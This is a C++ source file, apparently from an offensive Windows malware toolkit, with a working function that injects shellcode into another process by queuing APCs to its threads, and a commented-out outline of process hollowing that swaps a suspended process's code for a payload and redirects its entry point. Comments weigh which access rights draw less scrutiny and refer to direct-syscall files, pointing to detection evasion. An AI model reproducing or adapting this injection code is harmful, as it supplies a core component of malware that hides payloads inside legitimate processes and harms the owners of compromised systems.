#include "Injection.h"
#include <TlHelp32.h> // For CreateToolhelp32Snapshot, Thread32First, Thread32Next
#include <stdio.h>    // For debug prints (remove for release)

// Make sure PAPCFUNC is defined, it usually is from Windows.h via PTHREAD_START_ROUTINE
// typedef VOID (NTAPI *PAPCFUNC)(ULONG_PTR Parameter);


BOOL Injection::InjectViaAPC(HANDLE hProc, PVOID pRemoteShellcodeAddr) {
    if (hProc == NULL || pRemoteShellcodeAddr == NULL) {
        // printf("[-] InjectViaAPC: Invalid parameters.\n");
        return FALSE;
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        // printf("[-] InjectViaAPC: CreateToolhelp32Snapshot failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    DWORD targetProcessId = GetProcessId(hProc);
    BOOL apcQueued = FALSE;

    if (Thread32First(hSnapshot, &te32)) {
        do {
            // Check if this thread belongs to the target process
            if (te32.th32OwnerProcessID == targetProcessId) {
                // Try to open the thread with THREAD_SET_CONTEXT (required by QueueUserAPC)
                // or THREAD_DIRECT_IMPERSONATION which is often less scrutinized.
                // THREAD_SET_CONTEXT is implicitly part of THREAD_ALL_ACCESS.
                // For minimal rights, THREAD_SET_CONTEXT is what QueueUserAPC documentation implies.
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                if (hThread) {
                    // Queue the APC to the thread.
                    // The APC routine is the address of our shellcode.
                    // The parameter to the APC routine can be NULL or any ULONG_PTR value.
                    // If the shellcode expects a parameter, it should be passed here.
                    if (QueueUserAPC((PAPCFUNC)pRemoteShellcodeAddr, hThread, (ULONG_PTR)NULL)) {
                        // printf("[+] InjectViaAPC: APC queued to thread ID %lu\n", te32.th32ThreadID);
                        apcQueued = TRUE;
                        // Typically, you might queue to one or a few threads, not necessarily all.
                        // For simplicity here, we can break after the first success or try all.
                        // If trying all, remove the break.
                        // For robustness, you might want to queue to multiple threads.
                    } else {
                        // printf("[-] InjectViaAPC: QueueUserAPC failed for thread ID %lu. Error: %lu\n", te32.th32ThreadID, GetLastError());
                    }
                    CloseHandle(hThread);
                } else {
                    // printf("[-] InjectViaAPC: OpenThread failed for thread ID %lu. Error: %lu\n", te32.th32ThreadID, GetLastError());
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    } else {
        // printf("[-] InjectViaAPC: Thread32First failed. Error: %lu\n", GetLastError());
    }

    CloseHandle(hSnapshot);

    if (!apcQueued) {
        // printf("[-] InjectViaAPC: Failed to queue APC to any thread in the target process.\n");
    }

    return apcQueued;
}


/*
// --- Conceptual Process Hollowing Implementation ---
// This is a simplified outline and requires robust error handling, PE parsing, etc.

#include "Memory.h" // For RandomAlloc (if used for payload allocation)
#include "sysopen.h" // For NtUnmapViewOfSection, NtGetContextThread, NtSetContextThread, NtResumeThread etc.
                     // These would need to be added to sysopen.h and syscalls.asm

// Assuming necessary NTAPI function pointers are resolved (e.g., via ApiResolver or sysopen.c)
// Example:
// typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
// typedef NTSTATUS (NTAPI *pNtGetContextThread)(HANDLE ThreadHandle, PCONTEXT pContext);
// ... and so on for other NTAPIs needed.


BOOL Injection::InjectViaProcessHollowing(const wchar_t* targetProcessPath, BYTE* payloadPE, SIZE_T payloadPESize) {
    if (!targetProcessPath || !payloadPE || payloadPESize == 0) return FALSE;

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 1. Create the target process in a suspended state
    if (!CreateProcessW(NULL, (LPWSTR)targetProcessPath, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        // printf("[-] Hollow: CreateProcessW failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // At this point, pi.hProcess and pi.hThread are valid.

    // Parse the payloadPE to get its ImageBase and EntryPoint, SizeOfImage
    PIMAGE_DOS_HEADER payloadDosHeader = (PIMAGE_DOS_HEADER)payloadPE;
    if (payloadDosHeader->e_magic != IMAGE_DOS_SIGNATURE) { /* error */ CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE; } // Ensure no nested block comments
    PIMAGE_NT_HEADERS payloadNtHeaders = (PIMAGE_NT_HEADERS)(payloadPE + payloadDosHeader->e_lfanew);
    if (payloadNtHeaders->Signature != IMAGE_NT_SIGNATURE) { /* error */ CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE; } // Ensure no nested block comments

    PVOID payloadImageBase = (PVOID)payloadNtHeaders->OptionalHeader.ImageBase;
    DWORD payloadEntryPointRVA = payloadNtHeaders->OptionalHeader.AddressOfEntryPoint;
    DWORD payloadSizeOfImage = payloadNtHeaders->OptionalHeader.SizeOfImage;


    // 2. Unmap the original executable from the target process's memory
    // This requires getting the image base of the *target process's main module*.
    // One way is via PEB, but that's harder for a suspended external process.
    // Another common way is to assume it's loaded at its preferred ImageBase,
    // or get it from the CONTEXT's Rdx (PEB) -> ImageBaseAddress.
    // For simplicity here, let's assume we know it or the NtUnmapViewOfSection can use a handle.
    // Actually, NtUnmapViewOfSection works on a base address.
    // A common technique is to unmap the original executable at its known preferred base address.
    // This is tricky and needs the target's actual image base.
    // Let's assume we have a function GetRemotePeb(pi.hProcess) and can read its ImageBaseAddress.
    // For now, this step is simplified:
    // pNtUnmapViewOfSection(pi.hProcess, targetImageBaseFromPeb); // This is a placeholder for complex logic


    // 3. Allocate memory in the target process for the new PE
    // Ideally, try to allocate at payloadPE's preferred ImageBase.
    // If that fails, allocate anywhere and perform relocations.
    PVOID remoteImageBase = NULL;
    SIZE_T allocatedSize = payloadSizeOfImage; // Use SizeOfImage from payload

    // Try allocating at preferred base first for the payload
    NTSTATUS status = NtAllocateVirtualMemory(pi.hProcess, &payloadImageBase, 0, &allocatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status) || payloadImageBase != (PVOID)payloadNtHeaders->OptionalHeader.ImageBase) {
        // Failed to allocate at preferred base, or it was changed. Allocate anywhere.
        payloadImageBase = NULL; // Let system pick address
        allocatedSize = payloadSizeOfImage;
        status = NtAllocateVirtualMemory(pi.hProcess, &payloadImageBase, 0, &allocatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(status)) {
            // printf("[-] Hollow: NtAllocateVirtualMemory for payload failed. Status: 0x%X\n", status);
            TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE;
        }
    }
    remoteImageBase = payloadImageBase; // This is where our payload will be written

    // 4. Write the new PE into the allocated memory
    // This involves writing sections and potentially performing relocations if not loaded at preferred base.
    // For simplicity, assume payload is PIC or loaded at preferred base if relocations are skipped.
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, remoteImageBase, payloadPE, payloadSizeOfImage, &bytesWritten) || bytesWritten != payloadSizeOfImage) {
        // printf("[-] Hollow: WriteProcessMemory for payload failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE;
    }
    // If relocations are needed (remoteImageBase != payloadNtHeaders->OptionalHeader.ImageBase):
    // PerformRelocations(payloadPE, payloadSizeOfImage, remoteImageBase, payloadNtHeaders->OptionalHeader.ImageBase);


    // 5. Update the thread context of the main thread
    CONTEXT context = {0};
    context.ContextFlags = CONTEXT_FULL; // Or CONTEXT_CONTROL for just EIP/RIP
    if (!GetThreadContext(pi.hThread, &context)) { // Using Win32 GetThreadContext, or use NtGetContextThread
        // printf("[-] Hollow: GetThreadContext failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE;
    }

    #if defined(_WIN64)
        context.Rip = (DWORD64)((PBYTE)remoteImageBase + payloadEntryPointRVA);
    #else
        context.Eip = (DWORD)((PBYTE)remoteImageBase + payloadEntryPointRVA);
    #endif

    if (!SetThreadContext(pi.hThread, &context)) { // Using Win32 SetThreadContext, or use NtSetContextThread
        // printf("[-] Hollow: SetThreadContext failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE;
    }

    // 6. Resume the main thread
    if (ResumeThread(pi.hThread) == (DWORD)-1) { // Using Win32 ResumeThread, or use NtResumeThread
        // printf("[-] Hollow: ResumeThread failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE;
    }

    // printf("[+] Hollow: Process hollowing appears successful.\n");
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}
*/
